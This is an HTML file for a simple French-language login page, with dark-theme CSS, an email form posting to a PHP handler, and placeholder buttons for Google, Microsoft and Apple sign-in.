<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212; /* Fond noir */
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #1e1e1e; /* Fond sombre pour le formulaire */
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 300px;
            text-align: center;
             /* Nouveau positionnement pour décaler le bloc vers la gauche */
            position: absolute; /* Permet de placer l'élément avec top/left */
            top: 50%; /* Centre verticalement */
            left: 60%; /* Décale vers la gauche en fonction du pourcentage */
            transform: translateY(-50%); /* Centrage vertical précis */
        }

        h1 {
            margin-bottom: 20px;
        }

        input[type="email"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: none;
            background-color: #333;
            color: #fff;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        .alternative-login {
            margin: 20px 0;
        }

        .alternative-login button {
            background-color: #555;
            margin: 5px 0;
        }

        .alternative-login button.google {
            background-color: #dd4b39;
        }

        .alternative-login button.microsoft {
            background-color: #0078d7;
        }

        .alternative-login button.apple {
            background-color: #333;
        }

        .login-link {
            color: #bbb;
            font-size: 14px;
        }

        .login-link a {
            color: #4CAF50;
            text-decoration: none;
        }

        .login-link a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h1>Login</h1>
    <form action="mail.php" method="POST">
        <input type="email" name="email" placeholder="Adresse e-mail" required>
        <button type="submit">Continuer</button>
    </form>
    <p class="login-link">Vous n'avez pas de compte ? <a href="#">Créer un compte</a></p>

    <div class="alternative-login">
        <button class="google">Continuer avec Google</button>
        <button class="microsoft">Continuer avec Microsoft</button>
        <button class="apple">Continuer avec Apple</button>
    </div>
</div>

</body>
</html>
